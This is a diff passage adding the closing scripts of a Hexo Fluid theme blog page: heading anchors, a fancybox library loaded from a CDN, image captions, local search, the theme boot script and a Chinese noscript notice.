+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
